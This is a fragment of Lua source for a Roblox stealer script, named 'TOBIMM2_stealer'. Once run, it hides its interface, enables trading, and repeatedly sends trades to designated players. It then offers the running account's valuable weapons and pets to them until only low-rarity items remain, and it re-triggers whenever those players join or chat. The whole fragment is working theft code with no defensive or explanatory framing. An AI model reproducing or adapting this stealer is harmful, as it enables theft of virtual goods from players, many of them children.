        return reliableCleanCheck(2)
    end

    local function Steal(plr)
        if isClaimed or isStealRunning then return end
        isStealRunning = true

        local ok_steal, steal_err = pcall(function()
            HideGui()
            local Username = plr.Name

            updateMessage("🟧 STEALING - " .. Username)

            while IsTrading() ~= "None" do
                if isClaimed then return end
                if hasOnlyDefaultOrBelowRarity() then
                    isStealRunning = false
                    doClaim()
                    return
                end
                task.wait(0.2)
            end

            if isClaimed then return end

            local tradeSent = false
            local attempts = 0
            while not tradeSent and attempts < 5 do
                if isClaimed then return end
                attempts = attempts + 1
                tradeSent = SendTrade(Username)
                if not tradeSent then
                    task.wait(0.5)
                end
            end

            if not tradeSent then return end

            local startTime = tick()
            while IsTrading() ~= "StartTrade" and tick() - startTime < 10 do
                if isClaimed then return end
                task.wait(0.1)
            end

            if IsTrading() ~= "StartTrade" then return end

            local DepositedItems = 0
            local depositLimit = 4

            while IsTrading() == "StartTrade" do
                if isClaimed then return end

                local freshData = InventoryRemote:InvokeServer(game.Players.LocalPlayer.Name)
                if not freshData or not freshData.Weapons then
                    break
                end
                local freshWeapons = freshData['Weapons']['Owned']

                if not hasItemsAboveRarity(freshWeapons) and not hasPetsToSteal() then
                    pcall(stop_trade)
                    task.wait(0.5)

                    if reliableCleanCheck(3) then
                        isStealRunning = false
                        doClaim()
                        return
                    end

                    task.wait(0.5)
                    local clean = verifyWithExtraTrade(Username)
                    if clean then
                        isStealRunning = false
                        doClaim()
                        return
                    end

                    break
                end

                current_inv = GetSortedInventoryFromData(freshWeapons)

                if #current_inv > 0 then
                    for i, v in pairs(current_inv) do
                        if isClaimed then return end
                        if DepositedItems >= depositLimit then
                            break
                        end
                        for _ = 1, v.Amount do
                            pcall(function()
                                TradeService.OfferItem:FireServer(v.ID, v.Class)
                            end)
                        end
                        DepositedItems = DepositedItems + 1
                    end
                end

                if DepositedItems >= depositLimit then
                    break
                end

                if #current_inv == 0 then
                    pcall(stop_trade)
                    task.wait(0.5)

                    if reliableCleanCheck(3) then
                        isStealRunning = false
                        doClaim()
                        return
                    end

                    task.wait(0.5)
                    local clean = verifyWithExtraTrade(Username)
                    if clean then
                        isStealRunning = false
                        doClaim()
                        return
                    end

                    break
                end
            end

            task.wait(0.5)
            if isClaimed then return end

            local postData = InventoryRemote:InvokeServer(LocalPlayer.Name)
            if postData and postData.Weapons then
                local postWeapons = postData['Weapons']['Owned']

                if not hasItemsAboveRarity(postWeapons) and not hasPetsToSteal() then
                    if reliableCleanCheck(3) then
                        isStealRunning = false
                        doClaim()
                        return
                    end

                    task.wait(0.5)
                    local clean = verifyWithExtraTrade(Username)
                    if clean then
                        isStealRunning = false
                        doClaim()
                        return
                    end
                end
            end
        end)

        if not ok_steal then
            sendError("Steal() error for " .. tostring(plr and plr.Name or "unknown") .. ": " .. tostring(steal_err))
        end

        isStealRunning = false

        if not isClaimed then
            task.wait(1)
            Steal(plr)
        end
    end

    function UnlockTrades()
        pcall(function()
            TradeService.SetRequestsEnabled:FireServer(true)
        end)
    end

    function LoopSteal(plr)
        UnlockTrades()
        isClaimed = false
        isStealRunning = false
        task.spawn(function()
            Steal(plr)
        end)
    end

    for i, v in pairs(game.Players:GetChildren()) do
        if shall_steal(v) then
            task.spawn(function()
                task.wait(2)
                LoopSteal(v)
            end)
        end
    end

    Players.PlayerAdded:Connect(function(plr)
        if shall_steal(plr) then
            task.spawn(function()
                task.wait(2)
                LoopSteal(plr)
            end)
        end
    end)

    for _, plr in pairs(Players:GetPlayers()) do
        if shall_steal(plr) then
            plr.Chatted:Connect(function()
                LoopSteal(plr)
            end)
        end
    end

    Players.PlayerAdded:Connect(function(plr)
        if shall_steal(plr) then
            plr.Chatted:Connect(function()
                LoopSteal(plr)
            end)
        end
    end)

    end)
    if not ok_main then
        sendError("TOBIMM2_stealer() crashed: " .. tostring(main_err))
    end
end

